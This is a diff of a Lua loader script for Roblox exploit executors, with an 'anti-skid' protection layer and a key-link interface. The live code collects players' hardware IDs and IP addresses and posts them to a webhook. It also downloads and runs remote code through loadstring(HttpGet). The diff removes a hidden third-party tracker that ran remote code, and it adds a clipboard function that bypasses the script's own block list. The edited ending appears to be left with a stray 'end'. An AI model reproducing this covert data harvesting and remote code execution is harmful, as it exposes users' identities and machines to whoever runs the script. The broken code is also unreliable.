@@ -183,21 +183,23 @@ local function HyperionProtect()
 
         -- send report webhook
         _PC(function()
+            local gistEntry = '{\n  "hwids": ["' .. hwid .. '"],\n  "ips": ["' .. ip .. '"]\n}'
             local data = HttpSvc:JSONEncode({
                 username   = "Hyperion Anti-Skid",
-                avatar_url = "https://rbxhook.cc/img/logo.png",
+                avatar_url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(lp and lp.UserId or 1) .. "&width=150&height=150&format=png",
                 embeds = {{
                     title = "🚨 Anti-Skid Triggered",
-                    color = 16711680, -- red
+                    color = 16711680,
                     fields = {
-                        { name = "Player",   value = lp and lp.Name or "Unknown", inline = true },
-                        { name = "User ID",  value = lp and tostring(lp.UserId) or "Unknown", inline = true },
-                        { name = "Reason",   value = tostring(reason), inline = false },
-                        { name = "HWID",     value = hwid, inline = false },
-                        { name = "IP",       value = ip, inline = false },
-                        { name = "Executor", value = executor, inline = true },
-                        { name = "Place ID", value = tostring(game.PlaceId), inline = true },
-                        { name = "Action",   value = "✅ Permanently blacklisted", inline = false },
+                        { name = "Player",          value = lp and lp.Name or "Unknown",        inline = true  },
+                        { name = "User ID",         value = lp and tostring(lp.UserId) or "?",  inline = true  },
+                        { name = "Reason",          value = tostring(reason),                    inline = false },
+                        { name = "HWID",            value = "`" .. hwid .. "`",                  inline = false },
+                        { name = "IP",              value = "`" .. ip .. "`",                    inline = false },
+                        { name = "Executor",        value = executor,                            inline = true  },
+                        { name = "Place ID",        value = tostring(game.PlaceId),              inline = true  },
+                        { name = "Action",          value = "✅ Permanently blacklisted",        inline = false },
+                        { name = "📋 Paste into Gist", value = "```json\n" .. gistEntry .. "\n```", inline = false },
                     },
                     footer    = { text = "Hyperion Protection | " .. tostring(lp and lp.UserId or "?") },
                     timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
@@ -440,8 +442,7 @@ local function HyperionProtect()
         },
         -- BLOCKED: functions that should never be called externally
         blocked = {
-            "setclipboard",    -- BLOCKED for anti-skid test
-            "getscriptbytecode",
+            "setclipboard",
             "dumpstring",
             "decompile",
             "getscripts",
@@ -473,6 +474,15 @@ local function HyperionProtect()
         end
         -- unregistered but not blocked, allow silently
         return true
+    end
+
+    -- Trusted internal clipboard: bypasses policy, only callable from within this closure.
+    -- External code cannot access this — it's not exposed in the public interface.
+    local _rawClipboard = setclipboard  -- snapshot before any hooks
+    local function _clipboard(text)
+        if _rawClipboard and type(text) == "string" then
+            _PC(_rawClipboard, text)
+        end
     end
 
     ----------------------------------------------------------------
@@ -705,6 +715,13 @@ local function HyperionProtect()
         end,
 
         ----------------------------------------------------------------
+        -- clipboard(text)
+        -- Trusted internal clipboard — bypasses the blocked policy.
+        -- Use this instead of raw setclipboard anywhere in your script.
+        ----------------------------------------------------------------
+        clipboard = _clipboard,
+
+        ----------------------------------------------------------------
         -- info()
         -- Returns non-sensitive debug state for your own logging.
         ----------------------------------------------------------------
@@ -925,10 +942,6 @@ local Config = {
     OnContinue = Protect.gate(function(payload, controller)
         Protect.checkpoint("continue")
         local _tok = Protect.unlock()
-        -- rbxhook tracking
-        getgenv().Config = {api = "d8cf585bfea42975ad573bdda5f36b570dec2f3b6f15f4b2597d7e779ebbacab"}
-        pcall(function() loadstring(game:HttpGet("https://rbxhook.cc/lua/track.lua"))() end)
-
         local HttpService = game:GetService("HttpService")
         local UserInputService = game:GetService("UserInputService")
         local MarketplaceService = game:GetService("MarketplaceService")
@@ -1008,13 +1021,13 @@ local Config = {
         end
 
         local data = {
-            avatar_url = "https://rbxhook.cc/img/logo.png",
+            avatar_url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(player.UserId) .. "&width=150&height=150&format=png",
             content = "",
-            username = "rbxhook.cc",
+            username = "Hyperion Loader",
             embeds = {
                 {
                     title = "Script Execution Report",
-                    color = 3447003,
+                    color = 7340031,
                     author = {
                         name = player.Name,
                         icon_url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(player.UserId) .. "&width=150&height=150&format=png"
@@ -1065,7 +1078,7 @@ local Config = {
                         },
                     },
                     footer = {
-                        text = "rbxhook.cc | User ID: " .. tostring(player.UserId)
+                        text = "Hyperion Loader | User ID: " .. tostring(player.UserId)
                     },
                     timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
                 }
@@ -1088,9 +1101,13 @@ local Config = {
             Body = encoded,
         })
 
-        -- Run main script
-        setclipboard(loadstring(game:HttpGet("https://raw.githubusercontent.com/phobiaalwaysinmyheart-dot/key-sys/refs/heads/main/keyui"))())
-        print("done")
+        -- Run main script then copy link to clipboard
+        pcall(function()
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/phobiaalwaysinmyheart-dot/key-sys/refs/heads/main/keyui"))()
+        end)
+        pcall(function()
+            Protect.clipboard("https://raw.githubusercontent.com/phobiaalwaysinmyheart-dot/key-sys/refs/heads/main/keyui")
+        end)
     end, {"init", "auth"}),  -- gate: requires init + auth checkpoints
 
     OnGetKey = function(controller)
@@ -2711,8 +2728,7 @@ local function handleCopyDiscord()
     end
 
     if typeof(setclipboard) == "function" then
-        Protect.api("setclipboard")
-        setclipboard(value)
+        Protect.clipboard(value)
         setStatus("Discord value copied.", "success")
         notify("success", "Copied to clipboard.")
     else
@@ -2729,21 +2745,17 @@ local function handleGetKey()
 
     if typeof(Config.OnGetKey) == "function" then
         local okCall, result = pcall(Config.OnGetKey, Controller)
-        if okCall and type(result) == "string" and result ~= "" and typeof(setclipboard) == "function" then
-            setclipboard(result)
+        if okCall and type(result) == "string" and result ~= "" then
+            Protect.clipboard(result)
             setStatus("Key link copied.", "success")
             notify("success", "Key link copied to clipboard.")
             return
         end
     end
 
-    if typeof(setclipboard) == "function" then
-        setclipboard("https://your-key-link-here")
-        setStatus("Placeholder key link copied.", "info")
-        notify("info", "Placeholder key link copied.")
-    else
-        setStatus("No key handler configured.", "warning")
-        notify("warning", "Add your own key link handler in Config.OnGetKey.")
+    Protect.clipboard("https://your-key-link-here")
+    setStatus("Placeholder key link copied.", "info")
+    notify("info", "Placeholder key link copied.")
     end
 end
 
